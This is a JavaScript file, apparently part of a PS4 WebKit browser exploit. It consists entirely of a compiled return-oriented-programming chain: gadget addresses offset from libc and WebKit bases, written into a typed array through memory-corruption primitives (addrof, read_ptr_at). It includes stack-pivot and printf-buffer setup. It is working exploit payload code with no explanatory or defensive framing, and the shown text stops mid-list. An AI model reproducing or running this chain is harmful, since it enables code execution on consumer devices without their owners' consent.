var ropchain_array = new Uint32Array(50952);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0; // STUB
set_gadgets([
libc_base+788575, //pop rax
ropchain+65720, //rdi_bak
webkit_base+14461559, //mov [rax], rdi
libc_base+206806, //pop rdi
ropchain+65680, //stack_bottom
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
ropchain+112, //ret_addr
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+172368, //_main
//ret_addr:
libc_base+811575, //pop rsp
ropchain+65680 //stack_bottom
]);
//_ps4_printf_buffer:
var printf_buf_offset = 128;
set_gadget(printf_buf);
//_ps4_printf_fd:
db([4294967295, 4294967295]); // -0x1
//stack:
ropchain_offset += 16384;
//stack_bottom:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
main_ret,
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//rdi_bak:
//_pivot_back_addr:
db([0, 0]); // 0x0
set_gadgets([
pivot_addr,
//___builtin_bswap16:
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+65800, //L0
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L0:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+65896, //L2
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+65928, //L5
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L4:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L5:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+66016, //L6
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+66032, //L8
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L6:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L8:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+66192, //L12
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+66144, //L9
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66160, //L10
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L9:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L10:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L11:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L12:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+66248, //L14
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L14:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+66352, //L15
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+66384, //L17
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66368, //L16
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L15:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L16:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L17:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+66544, //L21
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66496, //L18
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66512, //L19
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L18:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L19:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L20:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L21:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+66648, //L23
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66632, //L22
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L22:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L23:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L24:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L25:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+66856, //L28
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66824, //L26
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L26:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L27:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L28:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+66960, //L30
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66944, //L29
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L29:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L30:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+67056, //L33
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L32:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L33:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+67144, //L34
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+67160, //L36
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L34:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L36:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+67320, //L40
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+67272, //L37
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67288, //L38
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L37:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L38:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L39:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L40:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+67376, //L42
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L42:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+67480, //L43
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+67512, //L45
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67496, //L44
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L43:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L44:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L45:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+67672, //L49
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67624, //L46
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67640, //L47
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L46:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L47:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L48:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L49:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+67776, //L51
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67760, //L50
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L50:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L51:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L52:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L53:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+67976, //L56
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67944, //L54
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L54:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L55:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L56:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68080, //L58
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+68064, //L57
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L57:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L58:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68192, //L61
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+68160, //L59
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L59:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L60:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L61:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68256, //L62
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L62:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+68312, //L65
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L65:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+68456, //L67
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68472, //L68
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+68440, //L66
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L66:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L67:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L68:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+68592, //L70
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68608, //L71
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+68576, //L69
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L69:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L70:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L71:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+68704, //L72
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68720, //L73
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L72:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L73:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+68832, //L74
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68816, //L75
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L75:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L74:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+68920, //L77
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+68904, //L76
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L76:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L77:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69016, //L78
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69032, //L79
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L78:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L79:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69144, //L80
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69128, //L81
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L81:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L80:
db([0, 0]); // 0x0
//___builtin_bswap32:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69216, //L82
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L82:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69312, //L84
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+69344, //L87
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L84:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L86:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L87:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+69432, //L88
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69448, //L90
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L88:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L90:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+69600, //L92
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69632, //L94
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+69584, //L91
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69616, //L93
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L91:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L92:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L93:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L94:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+69728, //L96
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+69712, //L95
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L95:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L96:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L97:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L98:
db([24, 0]); // 0x18
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69928, //L101
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+69896, //L99
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L99:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L100:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+70032, //L103
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70016, //L102
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L102:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L103:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+70136, //L106
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L105:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L106:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+70224, //L107
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+70240, //L109
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L107:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L109:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+70392, //L111
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+70424, //L113
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+70376, //L110
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+70408, //L112
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L110:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L111:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L112:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L113:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+70520, //L115
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70504, //L114
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L114:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L115:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L116:
db([16711680, 0]); // 0xff0000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+70632, //L119
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L119:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L120:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L121:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+70864, //L124
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+70832, //L122
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L122:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L123:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L124:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+70968, //L126
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70952, //L125
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L125:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+71024, //L127
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L127:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+71080, //L130
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L130:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+71208, //L133
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L132:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L133:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+71296, //L134
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+71312, //L136
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L134:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L136:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+71464, //L138
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+71496, //L140
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+71448, //L137
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+71480, //L139
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L137:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L138:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L139:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L140:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+71592, //L142
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+71576, //L141
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L141:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L142:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L143:
db([65280, 0]); // 0xff00
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+71704, //L146
